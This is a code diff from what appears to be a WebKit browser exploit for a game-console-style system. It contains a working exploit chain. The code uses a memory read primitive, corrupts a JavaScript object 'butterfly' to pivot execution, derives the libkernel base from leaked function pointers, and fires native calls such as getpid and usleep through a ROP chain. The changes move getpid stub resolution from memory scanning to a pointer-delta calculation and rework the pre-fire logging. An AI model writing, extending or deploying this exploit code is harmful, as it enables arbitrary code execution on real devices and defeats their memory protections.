@@ -57,7 +57,7 @@ import {
     resolveLibkernelRelroChunk,
     verifyLibkernelZeroRead,
     calcLkFromFnPtrZeroRead,
-    resolveGetpidStub, saveLastFnPtr, loadLastFnPtr, isGetpidStubAt,
+    resolveGetpidStub, saveLastFnPtr, loadLastFnPtr, isGetpidStubAt, getpidStubFromFn,
     calcLkBestFromFnPtr,
     resolveLkOnePltStep,
     extPtrToLkCandidates,
@@ -87,7 +87,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830bf";
+const BUILD_ID = "rw-20250830bg";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid @ lk (chain_poops) — needs lk in box" },
@@ -840,16 +840,24 @@ function ensureNativePrepForFire(p, off, nm) {
     mark("NATIVE-PREP", "fresh slab wb=" + nativePrep.webkitBase + " mode=" + nm);
 }
 
-/** Verified getpid stub — fn-only scan when fn in box (no lk+off reads → OOM). */
+/** getpid stub @ fire — fn+delta trust (≤1 read). No lk/stub scan (OOM). */
 function resolveGetpidStubOff(p, lk, off) {
     const fn = fnFromUi();
-    return resolveGetpidStub(p, lk, off, {
-        fnPtr: fn,
-        fnRadius: 0x20000,
-        fnProbes: 1024,
-        skipLkOffs: !!fn,
-        maxProbes: fn ? 0 : 512,
-    });
+    if (fn && lk) {
+        const addr = getpidStubFromFn(fn, off);
+        if (addr) {
+            let tag = "fn+delta-trust";
+            if (p) {
+                try {
+                    if (isGetpidStubAt(p, addr)) tag = "fn+delta";
+                } catch (_) { }
+            }
+            return { verified: true, addr, off: off.k_stubs[20], tag };
+        }
+    }
+    if (!p || !lk)
+        return { verified: false, tag: "no-fn", addr: null, off: null };
+    return resolveGetpidStub(p, lk, off, { maxProbes: 32, fnProbes: 0, skipLkOffs: false });
 }
 
 /** lk resolved on live primitive — no reload before native fire. */
@@ -3169,7 +3177,9 @@ function acceptFnFromHex(hexOverride) {
     saveLastFnPtr(ptr);
     saveLibkernelSession(h.lk, null, { forced: true });
     if (addrIn) addrIn.value = hex;
-    mark("LK-FN-OK", "fn=" + hex + " → lk=" + h.lk + " (" + h.via + ") 0 reads — stub @ N0 fire");
+    const stubAddr = getpidStubFromFn(ptr, off);
+    mark("LK-FN-OK", "fn=" + hex + " → lk=" + h.lk + " (" + h.via + ")"
+        + (stubAddr ? " stub=" + stubAddr + " (0 reads)" : ""));
     state("fn accepted (0 reads)", "ok");
     renderOut();
     try {
@@ -4501,29 +4511,6 @@ function finishPivotObj(p, prep, carrier) {
     return obj;
 }
 
-function bisectPreFireLog(p, prep, lk, stub, tag, hookMode) {
-    let stubOk = "?";
-    if (stub && stub.verified && stub.addr)
-        stubOk = "stub-ok@" + stub.tag;
-    else if (stub && stub.addr)
-        stubOk = "BAD:" + read8p(p, stub.addr);
-    else if (lk && stub && stub.off != null) {
-        const sv = read8p(p, lk.add32(stub.off));
-        stubOk = lkIsGetpidStub(sv) ? "stub-ok" : ("BAD:" + sv);
-    }
-    const hit = readPivotButterfly(p, prep.pivotCell);
-    let bfStr = hit ? String(hit.bf) : "null";
-    if (prep._pivotBfSource) bfStr += " src=" + prep._pivotBfSource;
-    if (prep._pivotBfUpgraded) bfStr += " pivot=" + prep._pivotBfUpgraded;
-    if (prep._pivotBfInjected) bfStr += " injected=1";
-    bisectLog("PRE-FIRE", tag + " lk=" + lk
-        + (stub && stub.off != null ? " +0x" + stub.off.toString(16) : "")
-        + " " + stubOk + " hook=" + hookMode
-        + " pivot=" + (params.get("pivot") || "empty")
-        + " cell=" + prep.pivotCell + " bf=" + bfStr + " S=" + prep.M.S
-        + " path=" + (prep._cap && prep._cap.path || "?"));
-}
-
 function nativeFireOpts(hookMode, stub) {
     const o = { hook: hookMode, carrier: window._wkCarrier || null };
     if (stub && stub.verified && stub.addr) {
@@ -4533,12 +4520,27 @@ function nativeFireOpts(hookMode, stub) {
     return o;
 }
 
+function bisectPreFireLog(p, prep, lk, stub, tag, hookMode) {
+    let stubOk = "?";
+    if (stub && stub.verified && stub.addr)
+        stubOk = "stub-ok@" + stub.tag + "=" + stub.addr;
+    const hit = readPivotButterfly(p, prep.pivotCell);
+    let bfStr = hit ? String(hit.bf) : "null";
+    if (prep._pivotBfSource) bfStr += " src=" + prep._pivotBfSource;
+    if (prep._pivotBfUpgraded) bfStr += " pivot=" + prep._pivotBfUpgraded;
+    if (prep._pivotBfInjected) bfStr += " injected=1";
+    bisectLog("PRE-FIRE", tag + " lk=" + lk + " " + stubOk + " hook=" + hookMode
+        + " pivot=" + (params.get("pivot") || "empty")
+        + " cell=" + prep.pivotCell + " bf=" + bfStr + " S=" + prep.M.S
+        + " path=" + (prep._cap && prep._cap.path || "?"));
+}
+
 function bisectFireGetpidHook(p, off, hookMode, tag) {
     const lk = lkFromUi();
-    if (!lk) throw new Error("paste lk in hex box → Accept lk");
+    if (!lk) throw new Error("Accept fn first (k_usleep ptr)");
     const stub = resolveGetpidStubOff(p, lk, off);
-    if (!stub.verified)
-        throw new Error("getpid stub not found — Accept fn (k_usleep) then N0");
+    if (!stub.verified || !stub.addr)
+        throw new Error("getpid stub — Accept fn (k_usleep) first");
     if (hookMode === "bf" || hookMode === "bf30" || hookMode === "dual")
         ensurePivotButterfly(p, nativePrep, window._wkCarrier || null);
     bisectPreFireLog(p, nativePrep, lk, stub, tag, hookMode);
